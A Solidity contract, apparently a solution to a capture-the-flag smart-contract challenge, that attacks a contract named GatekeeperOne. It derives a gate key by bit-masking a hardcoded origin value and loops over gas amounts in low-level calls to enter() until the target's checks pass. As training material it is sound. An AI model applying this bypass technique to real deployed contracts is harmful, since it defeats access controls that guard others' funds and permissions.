pragma solidity ^0.8.0;

import "./GatekeeperOne.sol";

contract GatekeeperOneAttack{
    bytes8 txOrigin16 = 0x321c7a88CFDc0F3a;
    bytes8 key = txOrigin16 & 0xFFFFFFFF0000FFFF;
    GatekeeperOne public gkpOne;

    function setGatekeeperOne(address _addr) public{
        gkpOne = GatekeeperOne(_addr);
    }

    function letMeIn() public{
        for (uint256 i = 0; i < 120; i++) {
            (bool result, bytes memory data) = address(gkpOne).call{gas:
                i + 150 + 8191*3}(abi.encodeWithSignature("enter(bytes8)", key));
            if (result){
                break;
            }
        }
    }
}